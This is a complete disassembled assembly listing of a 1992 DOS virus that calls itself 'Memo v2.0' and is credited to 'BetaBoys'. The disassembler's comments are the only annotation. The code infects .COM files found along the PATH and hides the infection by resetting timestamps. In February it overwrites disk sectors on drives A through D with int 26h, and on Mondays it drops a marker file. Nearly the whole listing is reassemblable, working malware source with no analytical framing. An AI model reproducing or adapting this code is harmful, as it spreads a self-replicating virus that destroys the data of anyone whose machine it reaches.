
PAGE  59,132

;==========================================================================
;==					                                 ==
;==				MEMO20B	                                 ==
;==					                                 ==
;==      Created:   18-May-92		                                 ==
;==      Passes:    5          Analysis	Options on: QRSU                 ==
;==					                                 ==
;==========================================================================


; The following equates show data references outside the range of the program.

data_1e		equ	0			; (0000:0000=0A3h)
data_2e		equ	0			; (580C:0000=0)
PSP_envirn_seg	equ	2Ch			; (580C:002C=0)
data_4e		equ	42h			; (580C:0042=0)
data_5e		equ	82h			; (580C:0082=0)
data_6e		equ	98h			; (580C:0098=0)
data_7e		equ	9Ch			; (580C:009C=0)
data_8e		equ	0A0h			; (580C:00A0=0)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

MEMO20B		proc	far

start:
		jmp	short real_start	; (0112)
		db	16 dup (90h)

;==========================================================================
;
;                       External Entry Point
;
;==========================================================================

real_start:					;  xref 580C:0100
		push	cx
		mov	dx,33Fh
		cld				; Clear direction
		mov	si,dx
		add	si,2Dh
		nop
		mov	di,100h			; (580C:0100=0EBh)
		mov	cx,3
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	si,dx
		mov	ah,30h
		int	21h			; DOS Services  ah=function 30h
						;  get DOS version number ax
		cmp	al,0

		jne	loc_1			; Jump if not equal
		jmp	loc_21			; (032D)
loc_1:						;  xref 580C:012D
		push	es
		mov	ah,2Fh
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	[si+23h],bx
		nop
		mov	[si+25h],es
		nop
		pop	es
		mov	dx,data_5e		; (580C:0082=0)
		nop
		add	dx,si
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		push	es
		push	si
		mov	es,ds:PSP_envirn_seg	; (580C:002C=0)
		mov	di,data_1e		; (0000:0000=0A3h)
loc_2:						;  xref 580C:0167
		nop
		pop	si
		nop
		push	si
		nop
		add	si,3Dh
		nop
		lodsb				; String [si] to al
		mov	cx,8000h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,4

locloop_3:					;  xref 580C:0169
		lodsb				; String [si] to al
		scasb				; Scan es:[di] for al
		jnz	loc_2			; Jump if not zero
		loop	locloop_3		; Loop if cx > 0

		pop	si
		pop	es
		mov	[si+39h],di
		nop
		mov	di,si
		add	di,42h
		nop
		mov	bx,si
		add	si,42h
		nop
		mov	di,si
		jmp	short loc_9		; (01BE)
loc_4:						;  xref 580C:01E4
		cmp	word ptr [si+39h],0
		nop
		jnz	loc_5			; Jump if not zero

		jmp	loc_20			; (031F)
loc_5:						;  xref 580C:0186
		push	ds
		push	si
		mov	ds,es:PSP_envirn_seg	; (580C:002C=0)
		mov	di,si
		mov	si,es:[di+39h]
		nop
		add	di,42h
		nop
loc_6:						;  xref 580C:01AA
		lodsb				; String [si] to al
		cmp	al,3Bh			; ';'
		je	loc_8			; Jump if equal
		cmp	al,0
		nop
		jz	loc_7			; Jump if zero
		nop
		stosb				; Store al to es:[di]
		nop
		jmp	short loc_6		; (019D)
loc_7:						;  xref 580C:01A5
		mov	si,data_2e		; (580C:0000=0)
loc_8:						;  xref 580C:01A0
		pop	bx
		pop	ds
		mov	[bx+39h],si
		nop
		nop
		cmp	ch,5Ch			; '\'
		je	loc_9			; Jump if equal
		mov	al,5Ch			; '\'
		stosb				; Store al to es:[di]
loc_9:						;  xref 580C:017F, 01B9
		mov	[bx+3Bh],di
		nop
		mov	si,bx
		add	si,33h
		nop
		mov	cx,6
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	si,bx
		mov	ah,4Eh			; 'N'
		mov	dx,data_4e		; (580C:0042=0)
		nop
		add	dx,si
		mov	cx,3
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jmp	short loc_11		; (01E2)
loc_10:						;  xref 580C:01EE, 01F6, 01FD
		mov	ah,4Fh
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
loc_11:						;  xref 580C:01DC
		jnc	loc_12			; Jump if carry=0
		jmp	short loc_4		; (0181)

loc_12:						;  xref 580C:01E2
		mov	ax,ds:data_6e[si]	; (580C:0098=0)
		and	al,1Fh
		cmp	al,1Fh
		je	loc_10			; Jump if equal
		cmp	word ptr ds:data_7e[si],0FA00h	; (580C:009C=0)
		ja	loc_10			; Jump if above
		cmp	word ptr ds:data_7e[si],0Ah	; (580C:009C=0)
		jb	loc_10			; Jump if below
		mov	di,[si+3Bh]
		nop
		push	si
		add	si,data_8e		; (580C:00A0=0)
loc_13:						;  xref 580C:020C
		lodsb				; String [si] to al
		stosb				; Store al to es:[di]
		cmp	al,0
		jne	loc_13			; Jump if not equal
		pop	si
		mov	ax,4300h
		mov	dx,data_4e		; (580C:0042=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  get attrb cx, filename @ds:dx
		mov	[si+2Bh],cx
		nop
		mov	ax,4301h
		and	cx,0FFFEh
		mov	dx,data_4e		; (580C:0042=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	ax,3D02h
		mov	dx,data_4e		; (580C:0042=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_14			; Jump if carry=0
		jmp	loc_19			; (0310)
loc_14:						;  xref 580C:0237
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=date
		mov	[si+27h],cx
		nop
		mov	[si+29h],dx
		nop
		mov	ah,2Ah
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		cmp	dh,2

		je	loc_15			; Jump if equal
		cmp	al,1
		je	loc_16			; Jump if equal
		jmp	short loc_17		; (0295)
		db	90h
loc_15:						;  xref 580C:0252
		mov	al,2
		mov	cx,96h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
						;  if disk under 32MB, dx=start
						;    cx=#sectors, ds:bx=buffer
						;  else  cx=-1, ds:dx=parm block
		mov	al,3
		mov	cx,96h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
						;  if disk under 32MB, dx=start
						;    cx=#sectors, ds:bx=buffer
						;  else  cx=-1, ds:dx=parm block
		mov	al,4
		mov	cx,96h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
						;  if disk under 32MB, dx=start
						;    cx=#sectors, ds:bx=buffer
						;  else  cx=-1, ds:dx=parm block
		mov	al,0
		mov	cx,96h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
						;  if disk under 32MB, dx=start
						;    cx=#sectors, ds:bx=buffer
						;  else  cx=-1, ds:dx=parm block
		int	20h			; DOS program terminate
loc_16:						;  xref 580C:0256
		mov	ah,3Ch			; '<'
		mov	dx,offset data_11	; (580C:033F='BetaBoys')
		mov	cx,2
		int	21h			; DOS Services  ah=function 3Ch
						;  create/truncate file @ ds:dx
		mov	bx,ax
		mov	ah,3Eh
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_17:						;  xref 580C:0258
		mov	ah,3Fh			; '?'
		mov	cx,3
		mov	dx,PSP_envirn_seg+1	; (580C:002D=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		jc	loc_18			; Jump if carry Set
		cmp	ax,3
		jne	loc_18			; Jump if not equal

		mov	ax,4202h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_18			; Jump if carry Set
		mov	cx,ax
		sub	ax,3
		mov	[si+31h],ax
		nop
		add	cx,32Dh
		mov	di,si
		sub	di,22Bh
		mov	[di],cx
		mov	ah,40h			; '@'
		mov	cx,2DAh
		mov	dx,si
		sub	dx,22Dh
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_18			; Jump if carry Set
		cmp	ax,2DAh
		jne	loc_18			; Jump if not equal
		mov	ax,4200h
		mov	cx,0
		mov	dx,0
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_18			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	cx,3
		mov	dx,si
		add	dx,30h
		nop
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_18:						;  xref 580C:02A2, 02A7, 02B4, 02D8
						;            02DD, 02EA
		mov	dx,[si+29h]
		nop
		mov	cx,[si+27h]
		nop
		and	cx,0FFE0h
		or	cx,1Fh
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=date
		mov	ah,3Eh
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_19:						;  xref 580C:0239
		mov	ax,4301h

		mov	cx,[si+2Bh]
		nop
		mov	dx,data_4e		; (580C:0042=0)
		nop
		add	dx,si
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
loc_20:						;  xref 580C:0188
		push	ds
		mov	ah,1Ah
		mov	dx,[si+23h]
		nop
		mov	ds,[si+25h]
		nop
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		pop	ds
loc_21:						;  xref 580C:012F
		pop	cx
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		mov	di,100h
		push	di
		xor	di,di			; Zero register
		retn	0FFFFh
data_11		db	'BetaBoys', 0		;  xref 580C:0287
		db	'Present:  Memo v2.0 /MaZ  '
		db	10 dup (0)
		db	0CDh, 20h, 90h,0E9h, 00h, 00h
		db	 2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h
		db	 00h, 00h, 00h, 00h, 50h, 41h
		db	 54h, 48h, 3Dh, 00h, 00h
		db	105 dup (0)

MEMO20B		endp

seg_a		ends



		end	start


____________________ CROSS REFERENCE - KEY ENTRY POINTS ___________________

    seg:off    type	   label
   ---- ----   ----   --------------------------------
   580C:0100   far    start
   580C:0112   extn   real_start

 __________________ Interrupt Usage Synopsis __________________

        Interrupt 20h : DOS program terminate
        Interrupt 21h : DOS Services  ah=function xxh
        Interrupt 21h :  ah=1Ah	 set DTA(disk xfer area) ds:dx
        Interrupt 21h :  ah=2Ah	 get date, cx=year, dh=month
        Interrupt 21h :  ah=2Fh	 get DTA ptr into es:bx
        Interrupt 21h :  ah=30h	 get DOS version number ax
        Interrupt 21h :  ah=3Ch	 create/truncate file @ ds:dx
        Interrupt 21h :  ah=3Dh	 open file, al=mode,name@ds:dx
        Interrupt 21h :  ah=3Eh	 close file, bx=file handle
        Interrupt 21h :  ah=3Fh	 read file, bx=file handle
        Interrupt 21h :  ah=40h	 write file  bx=file handle
        Interrupt 21h :  ah=42h	 move file ptr, bx=file handle
        Interrupt 21h :  ax=4300h  get attrb cx, filename @ds:dx
        Interrupt 21h :  ax=4301h  set attrb cx, filename @ds:dx
        Interrupt 21h :  ah=4Eh	 find 1st filenam match @ds:dx
        Interrupt 21h :  ah=4Fh	 find next filename match
        Interrupt 21h :  ax=5700h  get file date+time, bx=handle
        Interrupt 21h :  ax=5701h  set file date+time, bx=handle
        Interrupt 26h : Absolute disk write, drive al

 __________________ I/O Port Usage Synopsis  __________________

        No I/O ports used.

